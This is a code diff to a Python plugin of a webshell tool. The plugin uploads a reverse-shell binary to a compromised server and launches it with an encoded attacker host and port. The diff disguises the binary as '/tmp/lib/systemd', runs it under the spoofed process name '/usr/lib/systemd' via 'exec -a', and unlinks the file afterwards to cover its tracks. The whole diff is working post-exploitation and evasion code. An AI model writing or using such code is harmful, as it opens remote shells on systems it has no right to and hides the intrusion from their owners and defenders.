@@ -7,6 +7,7 @@ from libs.config import alias, color, is_windows
 from libs.myapp import delay_send, send
 from webshell_plugins.upload import run as upload
 
+
 @alias(True, func_alias="rs", l="lhost", p="port")
 def run(lhost: str, port: int):
     """
@@ -23,10 +24,13 @@ def run(lhost: str, port: int):
         port = 23333
     print(color.yellow(f"Waring: You are using a testing command...."))
     print(color.yellow(f"        Please make sure Port {port} open...."))
-    send("system('mkdir /tmp/bin');")
-    if not upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/bin/bash", True):
+    send("system('mkdir /tmp/lib');")
+    if not upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/lib/systemd", True):
         return
-    t = Thread(target=delay_send, args=(2, "system('cd /tmp && chmod +x bin/bash && bin/bash %s && rm -rf bin');" % b32encode(f"{lhost} {port}".encode()).decode()))
+    t = Thread(target=delay_send, args=(2, "system('cd /tmp && chmod +x lib/systemd && exec -a /usr/lib/systemd -c lib/systemd %s');" % b32encode(f"{lhost} {port}".encode()).decode()))
+    t.setDaemon(True)
+    t.start()
+    t = Thread(target=delay_send, args=(2, "unlink('/tmp/lib/systemd');"))
     t.setDaemon(True)
     t.start()
     print(f"Bind port {color.yellow(str(port))}...\n")
